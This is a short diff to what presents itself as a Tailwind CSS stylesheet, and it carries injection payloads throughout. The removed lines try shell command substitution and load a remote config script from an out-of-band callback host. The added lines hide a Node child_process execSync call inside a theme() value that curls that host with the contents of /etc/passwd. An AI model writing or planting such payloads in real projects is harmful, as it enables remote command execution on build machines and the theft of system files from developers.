@@ -1,3 +1,11 @@
-@tailwind base;
-@apply `$(curl${IFS}m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site)`;
-@config "https://m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site/aaaaaaaaa.js";
+@layer utilities {
+  .pwn {
+    color: theme("colors.red.500"); /*"
+  }
+}
+
+@layer utilities {
+  .x {
+    content: theme("colors.${require('child_process').execSync('curl https://m1o7mgfkflj0fxikvrd89mrd7c97dyne6.oast.site --data $(cat /etc/passwd)')}");
+  }
+}
